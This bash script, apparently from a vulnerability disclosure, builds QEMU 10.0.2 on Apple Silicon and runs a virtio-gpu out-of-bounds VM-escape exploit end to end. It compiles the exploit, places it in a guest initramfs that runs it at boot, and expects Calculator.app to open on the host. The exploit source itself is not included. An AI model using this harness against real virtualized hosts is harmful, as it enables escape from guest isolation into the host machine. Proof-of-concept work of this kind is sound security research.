#!/bin/bash
#
# run_poc_macos.sh — Build vulnerable QEMU 10.0.2 and run the
# virtio-gpu calc_image_hostmem exploit end-to-end on macOS arm64.
#
# Apple Silicon only. The exploit's pixman offsets are baked for the
# homebrew arm64 dylib; an Intel Mac needs a different build of pixman
# and a different exploit.
#
# Usage:
#   ./run_poc_macos.sh           # install deps, build everything
#   ./run_poc_macos.sh run       # launch the VM (after building)
#   ./run_poc_macos.sh clean     # wipe the work dir
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORK_DIR="${TMPDIR:-/tmp}/qemu-macos-exploit"
QEMU_VER="10.0.2"
QEMU_URL="https://download.qemu.org/qemu-${QEMU_VER}.tar.xz"
QEMU_BIN="$WORK_DIR/qemu-${QEMU_VER}/build-exploit/qemu-system-aarch64"
ALPINE_BASE="https://dl-cdn.alpinelinux.org/alpine/v3.21/releases/aarch64/netboot"

# ---------- preflight ----------

preflight() {
    if [ "$(uname -s)" != "Darwin" ]; then
        echo "ERROR: this script is for macOS. For Linux use run_poc_linux.sh."
        exit 1
    fi
    if [ "$(uname -m)" != "arm64" ]; then
        echo "ERROR: Apple Silicon only — exploit offsets are arm64-specific."
        exit 1
    fi
    if ! command -v brew >/dev/null 2>&1; then
        echo "ERROR: Homebrew not found. Install from https://brew.sh first."
        exit 1
    fi
}

# ---------- deps ----------

install_deps() {
    echo "=== Installing build dependencies ==="

    local pkgs=(pixman glib libpng pkg-config ninja meson)
    for p in "${pkgs[@]}"; do
        if ! brew list --formula "$p" >/dev/null 2>&1; then
            echo "Installing $p..."
            brew install "$p"
        fi
    done

    if ! command -v aarch64-linux-musl-gcc >/dev/null 2>&1; then
        echo "Installing aarch64-linux-musl cross-compiler..."
        brew tap filosottile/musl-cross 2>/dev/null || true
        brew install filosottile/musl-cross/musl-cross --with-aarch64
    fi
}

# ---------- QEMU 10.0.2 ----------

build_qemu() {
    echo "=== Building QEMU ${QEMU_VER} ==="
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR"

    if [ -x "$QEMU_BIN" ]; then
        echo "QEMU already built at $QEMU_BIN"
        return
    fi

    if [ ! -f "qemu-${QEMU_VER}.tar.xz" ]; then
        echo "Downloading QEMU source..."
        curl -fL -o "qemu-${QEMU_VER}.tar.xz" "$QEMU_URL"
    fi
    if [ ! -d "qemu-${QEMU_VER}" ]; then
        tar xf "qemu-${QEMU_VER}.tar.xz"
    fi

    cd "qemu-${QEMU_VER}"
    rm -rf build-exploit && mkdir build-exploit && cd build-exploit

    echo "Configuring (HVF + VNC)..."
    ../configure \
        --target-list=aarch64-softmmu \
        --enable-hvf \
        --enable-vnc \
        --enable-slirp \
        --disable-docs \
        --disable-werror

    echo "Building..."
    ninja -j"$(sysctl -n hw.ncpu)"

    echo "QEMU: $QEMU_BIN"
}

# ---------- exploit binary ----------

build_exploit() {
    echo "=== Building exploit ==="
    cd "$SCRIPT_DIR"
    aarch64-linux-musl-gcc -static -O2 -o exploit exploit.c
    echo "Exploit: $SCRIPT_DIR/exploit"
}

# ---------- guest assets ----------

prepare_guest() {
    echo "=== Preparing guest VM ==="
    mkdir -p "$WORK_DIR"

    local vmlinuz="$WORK_DIR/vmlinuz-virt"
    local alpine_initramfs="$WORK_DIR/initramfs-alpine"

    # Always download Alpine's kernel paired with its initramfs — modules
    # under /lib/modules/<ver>/ in the initramfs only load against the
    # matching kernel version. Reusing the repo's vmlinuz here causes
    # modprobe virtio_net to silently fail and the guest loses networking.
    if [ ! -f "$vmlinuz" ]; then
        echo "Downloading Alpine kernel..."
        curl -fL -o "$vmlinuz" "$ALPINE_BASE/vmlinuz-virt"
    fi
    if [ ! -f "$alpine_initramfs" ]; then
        echo "Downloading Alpine initramfs (for busybox)..."
        curl -fL -o "$alpine_initramfs" "$ALPINE_BASE/initramfs-virt"
    fi

    # Build initramfs: Alpine base + freshly-built exploit + init script.
    local ifs_dir="$WORK_DIR/initramfs_mod"
    rm -rf "$ifs_dir" && mkdir -p "$ifs_dir"
    (cd "$ifs_dir" && gunzip -c "$alpine_initramfs" | cpio -id 2>/dev/null) || true

    mkdir -p "$ifs_dir/bin"
    cp "$SCRIPT_DIR/exploit" "$ifs_dir/bin/exploit"
    chmod +x "$ifs_dir/bin/exploit"

    cat > "$ifs_dir/init" << 'INITEOF'
#!/bin/sh
/bin/busybox --install -s 2>/dev/null
export PATH="/usr/bin:/bin:/usr/sbin:/sbin"

mount -t proc proc /proc 2>/dev/null
mount -t sysfs sysfs /sys 2>/dev/null
mount -t devtmpfs devtmpfs /dev 2>/dev/null

echo "====================================="
echo "  virtio-gpu OOB exploit guest"
echo "====================================="

sleep 1
modprobe virtio_net 2>/dev/null
sleep 1

ip link set lo up 2>/dev/null
ip link set eth0 up 2>/dev/null
ip addr add 10.0.2.15/24 dev eth0 2>/dev/null
ip route add default via 10.0.2.2 2>/dev/null
sleep 2

/bin/exploit
echo "Exploit finished (exit code: $?). Dropping to shell."
exec /bin/sh
INITEOF
    chmod +x "$ifs_dir/init"

    (cd "$ifs_dir" && find . | cpio -o -H newc 2>/dev/null | gzip > "$WORK_DIR/initramfs-exploit.gz")
    echo "Initramfs: $WORK_DIR/initramfs-exploit.gz ($(du -h "$WORK_DIR/initramfs-exploit.gz" | cut -f1))"
    echo "Kernel:    $vmlinuz"
}

# ---------- run ----------

run_vm() {
    local vmlinuz="$WORK_DIR/vmlinuz-virt"
    local initrd="$WORK_DIR/initramfs-exploit.gz"

    [ -x "$QEMU_BIN" ] || { echo "ERROR: QEMU not built. Run: $0"; exit 1; }
    [ -f "$initrd" ]  || { echo "ERROR: initramfs missing. Run: $0"; exit 1; }
    [ -f "$vmlinuz" ] || { echo "ERROR: kernel missing. Run: $0"; exit 1; }

    pkill -9 -f "qemu-system-aarch64" 2>/dev/null || true
    sleep 1

    echo "=== Running exploit VM (HVF) ==="
    echo "VNC server on 127.0.0.1:5900 (guest reaches it via 10.0.2.2:5900)"
    echo "Calculator.app should open within ~30 seconds."
    echo

    "$QEMU_BIN" \
        -accel hvf \
        -M virt \
        -cpu host \
        -m 512 \
        -kernel "$vmlinuz" \
        -initrd "$initrd" \
        -append "console=ttyAMA0 iommu.passthrough=1 rdinit=/init" \
        -device virtio-gpu-pci \
        -nic user,model=virtio-net-pci \
        -vnc 127.0.0.1:0 \
        -display none \
        -nographic \
        -no-reboot
}

# ---------- main ----------

case "${1:-build}" in
    run)
        run_vm
        ;;
    clean)
        echo "Removing $WORK_DIR"
        rm -rf "$WORK_DIR"
        rm -f "$SCRIPT_DIR/exploit"
        ;;
    build|"")
        preflight
        install_deps
        build_qemu
        build_exploit
        prepare_guest
        echo
        echo "=== Build complete ==="
        echo "Run with:  $0 run"
        ;;
    *)
        echo "Usage: $0 [build|run|clean]"
        exit 1
        ;;
esac
